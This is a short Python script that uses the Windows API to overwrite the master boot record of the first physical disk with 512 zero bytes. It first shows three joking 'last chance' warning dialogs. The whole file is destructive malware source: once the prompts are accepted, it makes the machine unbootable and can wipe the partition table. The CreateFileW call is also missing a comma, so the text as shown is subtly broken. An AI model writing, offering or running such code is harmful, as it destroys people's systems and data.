from win32file import *
from win32api import *
from win32gui import *
from win32con import *
from win32ui import *
import sys

title = "SERIOUS WARNING"
description = "You are about to run a MBR OVERWRITING PROGRAM ON YOUR COMPUTER."

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
    print("No so bye bye")
    sys.exit(0)

title = "SAME THING BUT LAST CHANCE"
description = "Are you crazy? Yes or no if you want to run this MBR overwriting program"
if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
    print("No so bye bye LAST CHANCE")
    sys.exit(0)

title = "I lied, just one more"
description = "There is one more of these YES OR NO TO DESTROY COMPUTER?"
if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
    print("No so bye bye LAST CHANCE 3rd")
    sys.exit(0)

hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_ALWAYS
                      0, 0)
buffer = bytes([
    0 for i in range(512)
])

bytes_written = WriteFile(hDevice, buffer, None)
print("Wrote", bytes_written, "bytes to the MBR.")


CloseHandle(hDevice)

